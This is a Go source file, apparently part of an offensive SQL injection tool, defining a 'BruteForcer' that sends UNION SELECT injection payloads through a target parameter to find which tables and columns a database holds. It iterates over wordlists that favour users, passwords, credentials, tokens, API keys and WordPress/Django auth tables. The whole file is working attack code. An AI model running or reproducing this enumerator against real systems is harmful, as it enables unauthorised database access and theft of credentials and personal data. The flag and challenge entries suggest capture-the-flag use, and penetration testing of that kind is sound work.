package modules

import (
	"fmt"
	"strings"
)

var CommonTableNames = []string{
	"users", "user", "admin", "accounts", "account", "members", "member",
	"customers", "customer", "clients", "client", "employees", "employee",
	"staff", "login", "logins", "credentials", "credential",
	"passwords", "password", "passwd", "hash", "hashes", "secrets", "secret",
	"tokens", "token", "sessions", "session", "api_keys", "api_key",
	"config", "configs", "configuration", "settings", "setting",
	"logs", "log", "audit", "audit_log", "transactions", "transaction",
	"orders", "order", "payments", "payment", "invoices", "invoice",
	"products", "product", "items", "item", "categories", "category",
	"posts", "post", "pages", "page", "comments", "comment",
	"wp_users", "wp_posts", "wp_options", "wp_usermeta",
	"django_user", "auth_user", "auth_group",
	"users_data", "user_profiles", "profile",
	"mail", "emails", "email", "messages", "message",
	"flags", "flag", "challenges", "challenge", "hints", "hint",
	"files", "file", "uploads", "upload", "documents", "document",
}

var CommonColumnNames = []string{
	"id", "user_id", "username", "user_name", "login", "email", "mail",
	"password", "passwd", "pass", "hash", "password_hash", "token",
	"role", "roles", "permission", "permissions", "level", "access",
	"name", "first_name", "last_name", "full_name", "display_name",
	"phone", "mobile", "address", "city", "state", "zip", "country",
	"created_at", "updated_at", "created", "updated", "date",
	"status", "active", "enabled", "is_admin", "is_active",
	"flag", "secret", "key", "api_key", "session_id",
	"ip", "ip_address", "user_agent", "browser",
	"title", "content", "body", "description", "summary",
	"url", "slug", "path", "image", "file", "type", "category",
}

type BruteForcer struct {
	engine EngineInterface
}

func NewBruteForcer(engine EngineInterface) *BruteForcer {
	return &BruteForcer{engine: engine}
}

func (b *BruteForcer) BruteForceTables(param string, dbms string, database string) ([]string, error) {
	found := []string{}
	comment := "--"
	if dbms == "MySQL" || dbms == "MariaDB" {
		comment = "-- "
	}

	for _, table := range CommonTableNames {
		payload := fmt.Sprintf("' UNION SELECT 1 FROM %s.%s %s", database, table, comment)
		body, bodyLen, _, err := b.engine.Request(payload, param)
		if err != nil {
			continue
		}
		_ = body
		if bodyLen > 0 {
			found = append(found, table)
		}
	}

	return found, nil
}

func (b *BruteForcer) BruteForceColumns(param string, dbms string, database string, table string) ([]string, error) {
	found := []string{}
	comment := "--"
	if dbms == "MySQL" || dbms == "MariaDB" {
		comment = "-- "
	}

	for _, col := range CommonColumnNames {
		payload := fmt.Sprintf("' UNION SELECT %s FROM %s.%s %s", col, database, table, comment)
		body, _, _, err := b.engine.Request(payload, param)
		if err != nil {
			continue
		}
		if strings.Contains(body, col) || len(body) > 10 {
			found = append(found, col)
		}
	}

	return found, nil
}

func (b *BruteForcer) GetCommonColumnsForTable(tableName string) []string {
	lower := strings.ToLower(tableName)
	hints := map[string][]string{
		"user":    {"id", "username", "password", "email", "role", "created_at"},
		"admin":   {"id", "username", "password", "level", "last_login"},
		"account": {"id", "username", "email", "password", "status", "created_at"},
		"profile": {"id", "user_id", "first_name", "last_name", "phone", "avatar"},
		"post":    {"id", "title", "content", "author_id", "created_at", "status"},
		"product": {"id", "name", "price", "description", "category", "stock"},
		"order":   {"id", "user_id", "total", "status", "created_at"},
		"payment": {"id", "order_id", "amount", "method", "status", "date"},
		"log":     {"id", "user_id", "action", "ip", "timestamp"},
		"config":  {"id", "key", "value", "description"},
		"flag":    {"id", "name", "value", "points", "category"},
	}

	for key, cols := range hints {
		if strings.Contains(lower, key) {
			return cols
		}
	}

	return CommonColumnNames[:20]
}

func (b *BruteForcer) SuggestInterestingTables(tables []string) []string {
	interesting := []string{}
	for _, t := range tables {
		lower := strings.ToLower(t)
		for _, common := range CommonTableNames {
			if strings.EqualFold(lower, common) || strings.Contains(lower, common) {
				interesting = append(interesting, t)
				break
			}
		}
	}
	return interesting
}
